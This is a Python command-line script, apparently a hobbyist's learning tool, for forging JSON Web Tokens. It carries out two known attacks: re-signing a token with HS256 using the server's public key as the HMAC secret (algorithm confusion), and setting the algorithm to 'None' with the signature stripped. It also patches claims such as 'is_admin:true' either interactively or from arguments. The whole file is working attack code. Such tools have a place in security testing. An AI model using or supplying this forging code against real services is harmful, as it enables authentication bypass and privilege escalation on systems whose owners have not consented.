#!/usr/local/python3
import hashlib
import base64
import hmac
import argparse
import json
import sys 

QUIET_OUTPUT_MODE = False
ONE_LINER_MODE = False

'''
Current Types:
    0 == default mode, we will spit out both results
    1 == modify and sign HS256 with public key
    2 == modify and remove algorithm
'''
modes = {
    "0" : {
        "name" : "all"
    },
    "1" : {
        "name" : "Resign with public key"
    },
    "2" : {
        "name" : "Rebuild with None"
    }
}

JWT_TYPE_MODE = "0"

def banner():
    print("JWT the F**K?!")
    print("Just trying to further understand web tokens...")
    print(" - Gary @crawl3r")
    print("")
    print("Mode: [%s] %s" % (JWT_TYPE_MODE, modes[JWT_TYPE_MODE]["name"]))
    print("")


def handle_args():
    parser = argparse.ArgumentParser()

    subparser = parser.add_subparsers(dest='mode')
    default_parser = subparser.add_parser('0')
    resign_parser = subparser.add_parser('1')
    none_parser = subparser.add_parser('2')

    # mode 0 arguments (do all)
    default_parser.add_argument("--key", type=str, required=True, help="The local path to the public key file")
    default_parser.add_argument('--choices', type=str, help="Payload choices to patch. i.e: \"user:admin,is_admin:true\"")

    # mode 1 arguments only (resign with key)
    resign_parser.add_argument("--key", type=str, required=True, help="The local path to the public key file")
    resign_parser.add_argument('--choices', type=str, help="Payload choices to patch. i.e: \"user:admin,is_admin:true\"")

    # mode 2 arguments only (rebuild with none algorithm)
    none_parser.add_argument('--choices', type=str, help="Payload choices to patch. i.e: \"user:admin,is_admin:true\"")
    none_parser.add_argument('--spam', type=str, help="Use variations of upper/lower case to spam a selection of JWTs (None, NOnE, etc)")
    
    # parser.add_argument('--ol', help='Run in one-liner', action='store_true')
    parser.add_argument("jwt", type=str, help="The server supplied JWT")
    parser.add_argument('--quiet', help='Surpress debug prints and output noise', action='store_true')
    
    args = parser.parse_args()
    return args


def decode_jwt(jwt):
    chunks = jwt.split(".")
    
    if len(chunks) != 3:
        print("JWT does not look correct, check supplied")
        sys.exit(99)

    header = base64.urlsafe_b64decode(chunks[0] + "==").decode('utf-8')
    header = json.loads(header)
    payload = base64.urlsafe_b64decode(chunks[1] + "==").decode('utf-8')
    payload = json.loads(payload)

    return header, payload


def sanity_check_one_liner_args(choices, payload):
    split_choices = choices.split(",")

    for c in split_choices:
        split_choice = c.split(":")
        if len(split_choice) < 2:
            print("[!] Choice was not correctly submitted: %s" % c)
            return False

        if split_choice[0] not in payload.keys():
            print("[!] Choice was not within the original JWT payload: %s" % split_choice[0])
            return False

    return True


def load_public_key(file):
    f = open(file)
    key = f.read()
    return key


def handle_jwt_header_patching(header, new_algo):
    patched_header = header

    # get stuck in logic loop
    if patched_header["alg"] != new_algo:
        patched_header["alg"] = new_algo

        if QUIET_OUTPUT_MODE == False:
            print("[*] Algorithm patched to %s" % patched_header["alg"])
    else:
        if QUIET_OUTPUT_MODE == False:
            print("[*] JWT is already %s" % patched_header["alg"])

    return patched_header


def handle_jwt_payload_patching(payload):
    patched_payload = payload

    while True:
        # dump current options
        i = 0

        if QUIET_OUTPUT_MODE == False:
            print("Current payload options:")

        for key in patched_payload.keys():
            print("\t[%d] -> %s : %s : %s" % (i, key, patched_payload[key], type(patched_payload[key])))
            i += 1

        if QUIET_OUTPUT_MODE == False:
            print("[-1] -> Finish patching")
            print("")

        choice = int(input("Select the value above you want to patch: "))

        if choice != -1 and choice >= len(patched_payload.keys()):
            print("[!] Illegal choice")
            print("")
        elif choice == -1:
            if QUIET_OUTPUT_MODE == False:
                print("[*] Finished patching")

            break
        else:
            key_choice = list(patched_payload.keys())[choice]
            new_val = input("New value for %s (type: %s): " % (key_choice, type(patched_payload[key_choice])))
            patched_payload[key_choice] = new_val

    return patched_payload


def auto_patch_payload(choices, payload):
    patched_payload = payload
    split_choices = choices.split(",")

    for c in split_choices:
        split_choice = c.split(":")
        patched_payload[split_choice[0]] = split_choice[1]

    return patched_payload


def sign_new_jwt(key, header, payload):
    if key != "":
        encoded_header = base64.urlsafe_b64encode(json.dumps(header).encode('utf-8')).decode('utf-8').rstrip("=")
        encoded_payload = base64.urlsafe_b64encode(json.dumps(payload).encode('utf-8')).decode('utf-8').rstrip("=")

        hmac_sig = hmac.new(bytes(key, encoding='utf-8'), (encoded_header + "." + encoded_payload).encode('utf-8'), hashlib.sha256).digest()
        encoded_sig = base64.urlsafe_b64encode(hmac_sig).decode('utf-8').rstrip("=")
        return encoded_header + "." + encoded_payload + "." + encoded_sig
    else:
        encoded_header = base64.urlsafe_b64encode(json.dumps(header).encode('utf-8')).decode('utf-8').rstrip("=")
        encoded_payload = base64.urlsafe_b64encode(json.dumps(payload).encode('utf-8')).decode('utf-8').rstrip("=")
        return encoded_header + "." + encoded_payload + "."


if __name__ == "__main__":
    args = handle_args()

    #ONE_LINER_MODE = args.ol
    QUIET_OUTPUT_MODE = args.quiet
    JWT_TYPE_MODE = args.mode

    if QUIET_OUTPUT_MODE == False:
        banner()

    ##############################################################
    #                           MODE 0
    #   Performs both a public key resign and a None rebuild
    ##############################################################
    if JWT_TYPE_MODE == "0":
        if QUIET_OUTPUT_MODE == False:
            print("[*] Loading public key from: %s" % args.key)

        public_key = load_public_key(args.key)

        if QUIET_OUTPUT_MODE == False:
            print(public_key)

        if QUIET_OUTPUT_MODE == False:
            print("[*] Decoding supplied JWT")
        
        header, payload = decode_jwt(args.jwt)

        # Sanity check the input choices to patch and ensure they exist within the submitted cookie
        if ONE_LINER_MODE:
            if args.choices == None:
                if type(args.choices) is not str:
                    sys.exit(99)

            sanity_check_passed = sanity_check_one_liner_args(args.choices, payload)
            if sanity_check_passed == False:
                sys.exit(99)
    
        if QUIET_OUTPUT_MODE == False:
            print("\tHeader: %s" % header)
            print("\tPayload: %s" % payload)

        # pass in the new algo for the header
        patched_header = handle_jwt_header_patching(header, "HS256")
        
        if QUIET_OUTPUT_MODE == False:
            print("\tHeader: %s" % patched_header)

        patched_payload = {}
        
        if ONE_LINER_MODE:
            patched_payload = auto_patch_payload(args.choices, payload)
        else:
            patched_payload = handle_jwt_payload_patching(payload)
        
        if QUIET_OUTPUT_MODE == False:
            print("\tPayload: %s" % patched_payload)

        signed_jwt = sign_new_jwt(public_key, patched_header, patched_payload)

        if QUIET_OUTPUT_MODE == False:
            print("New JWT created and signed:")
            print("----------------------------------")

        print(signed_jwt)
        
        if QUIET_OUTPUT_MODE == False:
            print("----------------------------------")

    ##############################################################
    #                           MODE 1
    #   Resigns with public key
    ##############################################################
    elif JWT_TYPE_MODE == "1":
        if QUIET_OUTPUT_MODE == False:
            print("[*] Loading public key from: %s" % args.key)

        public_key = load_public_key(args.key)

        if QUIET_OUTPUT_MODE == False:
            print(public_key)

        if QUIET_OUTPUT_MODE == False:
            print("[*] Decoding supplied JWT")
        
        header, payload = decode_jwt(args.jwt)

        # Sanity check the input choices to patch and ensure they exist within the submitted cookie
        if ONE_LINER_MODE:
            if args.choices == None:
                if type(args.choices) is not str:
                    sys.exit(99)

            sanity_check_passed = sanity_check_one_liner_args(args.choices, payload)
            if sanity_check_passed == False:
                sys.exit(99)
    
        if QUIET_OUTPUT_MODE == False:
            print("\tHeader: %s" % header)
            print("\tPayload: %s" % payload)

        # pass in the new algo for the header
        patched_header = handle_jwt_header_patching(header, "HS256")
        
        if QUIET_OUTPUT_MODE == False:
            print("\tHeader: %s" % patched_header)

        patched_payload = {}
        
        if ONE_LINER_MODE:
            patched_payload = auto_patch_payload(args.choices, payload)
        else:
            patched_payload = handle_jwt_payload_patching(payload)
        
        if QUIET_OUTPUT_MODE == False:
            print("\tPayload: %s" % patched_payload)

        signed_jwt = sign_new_jwt(public_key, patched_header, patched_payload)

        if QUIET_OUTPUT_MODE == False:
            print("New JWT created and signed:")
            print("----------------------------------")

        print(signed_jwt)
        
        if QUIET_OUTPUT_MODE == False:
            print("----------------------------------")    

    ##############################################################
    #                           MODE 2
    #   Resigns with public key
    ##############################################################
    elif JWT_TYPE_MODE == "2":
        if QUIET_OUTPUT_MODE == False:
            print("[*] Decoding supplied JWT")
        
        header, payload = decode_jwt(args.jwt)

        # Sanity check the input choices to patch and ensure they exist within the submitted cookie
        if ONE_LINER_MODE:
            if args.choices == None:
                if type(args.choices) is not str:
                    sys.exit(99)

            sanity_check_passed = sanity_check_one_liner_args(args.choices, payload)
            if sanity_check_passed == False:
                sys.exit(99)
    
        if QUIET_OUTPUT_MODE == False:
            print("\tHeader: %s" % header)
            print("\tPayload: %s" % payload)

        # pass in the new algo for the header
        # args.spam
        patched_header = handle_jwt_header_patching(header, "None")
        
        if QUIET_OUTPUT_MODE == False:
            print("\tHeader: %s" % patched_header)

        patched_payload = {}
        
        if ONE_LINER_MODE:
            patched_payload = auto_patch_payload(args.choices, payload)
        else:
            patched_payload = handle_jwt_payload_patching(payload)
        
        if QUIET_OUTPUT_MODE == False:
            print("\tPayload: %s" % patched_payload)

        # NOTE: we don't pass in a key here so it ignores the payload signing, just base64 blobs it back to us
        signed_jwt = sign_new_jwt("", patched_header, patched_payload)

        if QUIET_OUTPUT_MODE == False:
            print("New JWT created and signed:")
            print("----------------------------------")

        print(signed_jwt)
        
        if QUIET_OUTPUT_MODE == False:
            print("----------------------------------")
    else:
        print("Mode not recognised")